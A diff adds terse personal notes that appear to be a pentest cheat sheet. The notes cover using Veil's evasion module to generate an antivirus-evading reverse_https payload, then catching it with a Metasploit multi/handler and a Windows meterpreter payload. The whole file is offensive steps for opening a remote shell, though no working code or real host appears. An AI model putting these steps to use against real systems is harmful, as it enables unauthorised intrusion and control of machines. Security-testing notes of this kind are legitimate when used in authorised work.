@@ -1,0 +1,16 @@
+veil
+use evasion
+use 15(reverse_https)
+set lhost and lport
+make changes like set processors and set sleep
+generate
+name--------->rev_https_8080
+
+<---------- listening for incoming connections------->
+
+msfconsole
+use exploit/multi/handler
+options
+set payload windows/meterpreter/reverse_https
+set lhost and lport
+exploit------>listening for incoming connections
